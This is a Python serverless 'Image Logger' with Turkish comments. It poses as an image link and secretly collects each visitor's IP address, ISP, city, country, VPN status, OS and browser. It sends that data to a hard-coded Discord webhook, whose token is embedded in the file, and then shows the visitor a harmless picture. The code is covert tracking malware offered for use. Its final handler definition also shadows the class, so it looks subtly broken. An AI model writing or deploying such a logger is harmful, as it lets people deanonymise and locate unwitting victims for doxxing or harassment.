from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests, base64, httpagentparser

config = {
    "webhook": "https://discord.com/api/webhooks/1489972140680679514/y3WNCXz1DgvFnYtfXME1cWRiEwhoBATmkDnUfI85b07Sl93r3QGePcnWJlzTOcpjU8hC",
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
    "username": "Image Logger",
    "color": 0x00FFFF
}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # IP al
            ip = self.headers.get('x-forwarded-for') or self.client_address[0]
            useragent = self.headers.get('user-agent')

            # Detaylı bilgi al
            try:
                info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=8).json()
            except:
                info = {}

            os, browser = httpagentparser.simple_detect(useragent or "")

            # Discord'a gönder
            embed = {
                "username": config["username"],
                "embeds": [{
                    "title": "Image Logger - New Hit",
                    "color": config["color"],
                    "fields": [
                        {"name": "IP", "value": f"`{ip}`", "inline": False},
                        {"name": "Provider", "value": f"`{info.get('isp', 'Unknown')}`", "inline": True},
                        {"name": "Country", "value": f"`{info.get('country', 'Unknown')}`", "inline": True},
                        {"name": "City", "value": f"`{info.get('city', 'Unknown')}`", "inline": True},
                        {"name": "VPN", "value": f"`{info.get('proxy', False)}`", "inline": True},
                        {"name": "OS", "value": f"`{os}`", "inline": True},
                        {"name": "Browser", "value": f"`{browser}`", "inline": True},
                    ]
                }]
            }
            requests.post(config["webhook"], json=embed)

            # Resmi göster
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(f'<img src="{config["image"]}" style="width:100%; height:100vh; object-fit:contain; background:black;">'.encode())

        except:
            self.send_response(500)
            self.end_headers()

# VERCEL İÇİN ZORUNLU HANDLER
def handler(event, context=None):
    return handler
